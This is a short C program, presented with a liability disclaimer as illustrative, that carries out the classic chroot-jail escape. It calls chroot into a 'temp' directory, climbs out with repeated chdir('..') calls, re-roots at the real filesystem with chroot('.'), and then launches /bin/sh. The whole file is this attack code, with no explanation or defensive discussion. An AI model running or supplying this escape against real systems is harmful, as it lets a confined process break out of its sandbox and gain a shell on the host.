/* This source code is for illustrative purpose alone. 
   The responsibility for any unknown issues or damages
    arising out of the usage of this code 
   lies with the user */
   
#include <stdio.h>  
#include <stdlib.h>  
#include <fcntl.h>  
#include <unistd.h>  
#include <string.h>  

#define TEMP_DIR "temp"
	    
int main() {  
	    
	if (chroot(TEMP_DIR)<0) {  
     		printf("Failed to chroot to the current directory\n");
	     	exit(1);  
	}  
	    
	for(int i=0;i<4;i++) {  
	     	chdir("..");  
	}  
	chroot(".");  
	    
	if (execl("/bin/sh","-i",NULL)<0) {  
	     	printf("Execing a new shell failed\n");
	     	exit(1);  
	}  
}  
